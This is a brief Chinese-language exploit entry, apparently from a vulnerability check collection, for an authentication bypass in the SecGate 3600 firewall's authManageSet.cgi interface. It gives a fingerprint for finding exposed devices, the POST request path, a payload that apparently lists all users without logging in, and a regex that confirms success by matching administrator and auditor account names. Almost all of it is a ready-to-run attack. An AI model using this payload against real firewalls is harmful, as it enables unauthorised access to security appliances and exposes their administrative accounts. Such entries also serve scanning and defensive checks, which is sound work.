# 网神SecGate3600authManageSet.cgi接口登录绕过

网神SecGate3600authManageSet.cgi接口登录绕过 ｜ 其他 ｜ —
- **指纹**：`body="sec_gate_image/login_02.gif"`
- **请求**：`POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1`

**Payload**
```
type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
```
- **响应特征**：200 ^(?=.*?(?:管理员|审计员)).*?$